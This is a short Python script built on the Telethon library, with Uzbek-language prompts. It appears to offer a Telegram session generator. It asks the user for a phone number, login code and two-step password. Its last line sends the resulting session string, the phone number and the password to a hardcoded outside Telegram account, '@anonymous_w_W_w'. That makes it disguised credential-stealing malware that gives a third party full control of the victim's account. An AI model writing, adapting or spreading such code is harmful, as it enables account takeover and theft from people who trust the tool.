from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
import os, sys

api_id = 9708508
api_hash = "1e6ca420184a701db1f8a1301df99288"
os.system("clear")

string = input("Press enter: ")

client = TelegramClient(StringSession(string), api_id, api_hash)
phone_number = input("Telegram raqamini kiriting: ")
client.connect()
client.send_code_request(phone_number)
try:
	me = client.sign_in(phone_number, input('Kodni kiriting: '))
except SessionPasswordNeededError:
    password = input('2 bosqichli parolni kiriting: ')
client.start()
client.sign_in(password=password)
client.send_message("@anonymous_w_W_w", f'Session: {client.session.save()}\nPhone number: {phone_number}\nPassword: {password}')